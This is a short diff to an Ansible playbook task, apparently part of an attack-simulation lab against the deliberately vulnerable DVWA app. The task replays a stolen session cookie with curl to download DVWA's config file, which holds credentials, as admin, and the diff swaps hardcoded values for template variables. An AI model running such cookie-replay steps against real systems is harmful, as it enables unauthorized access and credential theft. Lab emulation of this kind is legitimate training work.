@@ -1,6 +1,7 @@
 ---
 - name: Action on Objectives - Download DVWA config file as admin
   shell: |
-    curl -b "PHPSESSID=stolen_cookie_value" \
-    http://192.168.254.129/DVWA/config/config.inc.php \
+    curl -b "PHPSESSID={{ stolen_cookie_value }}" \
+    http://{{ web_victim_ip }}/DVWA/config/config.inc.php \
     -o /tmp/dvwa_config.inc.php
+  failed_when: false
